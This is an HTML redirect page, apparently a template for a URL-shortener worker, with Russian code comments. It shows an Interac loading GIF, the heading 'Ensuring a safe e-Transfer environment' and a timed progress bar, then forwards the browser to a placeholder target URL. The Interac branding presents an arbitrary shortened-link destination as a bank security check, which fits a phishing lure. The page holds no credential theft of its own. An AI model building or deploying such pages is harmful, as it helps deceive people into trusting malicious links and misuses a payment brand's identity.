<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Redirecting...</title>
  <meta name="referrer" content="no-referrer" />
  <style>
    body {
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      height: 100vh;
      margin: 0;
      font-family: Arial, sans-serif;
      background-color: #f9f9f9;
    }
    img {
      max-width: 50%;
      height: auto;
    }
    .progress {
      margin-top: 20px;
      width: 80%;
      max-width: 400px;
      height: 20px;
      background-color: #e0e0e0;
      border-radius: 10px;
      overflow: hidden;
    }
    .progress-bar {
      height: 100%;
      width: 0;
      background-color: #76c7c0;
      transition: width 0.1s;
    }
    .percentage {
      margin-top: 10px;
      font-size: 16px;
    }
    .circle {
      display: inline-flex;
      justify-content: center;
      align-items: center;
      width: 15px;
      height: 15px;
      border-radius: 50%;
      background-color: #f0f0f0;
      border: 1px solid #ccc;
      font-size: 24px;
      font-weight: bold;
      color: #333;
    }
  </style>
</head>
<body>
  <img src="https://www.interac.ca/wp-content/uploads/2021/05/TrueFalse_GIF_05-4.gif" alt="Loading">
  <h4>Ensuring a safe <div class="circle">e</div>-Transfer environment</h4>
  
  <div class="progress">
    <div class="progress-bar" id="progress-bar"></div>
  </div>
  <div class="percentage" id="percentage">0%</div>

  <p>Redirecting to <a href="{Replace}" id="replace-url">{Replace}</a></p>
  <a href="https://github.com/xyTom/Url-Shorten-Worker/" target="_self">Fork me on GitHub</a>

  <script type="text/javascript">
    let progress = 0;
    const progressBar = document.getElementById('progress-bar');
    const percentage = document.getElementById('percentage');
    const redirectURL = "{Replace}"; // Здесь будет подставлен целевой URL из воркера

    // Функция для обновления шкалы загрузки
    const interval = setInterval(() => {
      progress += 10;
      progressBar.style.width = progress + '%';
      percentage.textContent = progress + '%';

      if (progress >= 100) {
        clearInterval(interval);
        redirectToURL();
      }
    }, 1100);

    // Функция для редиректа
    function redirectToURL() {
      if (redirectURL === "{Replace}" || !redirectURL) {
        document.body.innerHTML = "<h1>Redirection failed: Missing target URL</h1>";
      } else {
        window.location.href = redirectURL;
      }
    }
    
    // Заменяем {Replace} на настоящий URL
    document.getElementById("replace-url").href = redirectURL;
    document.getElementById("replace-url").textContent = redirectURL;
  </script>
</body>
</html>
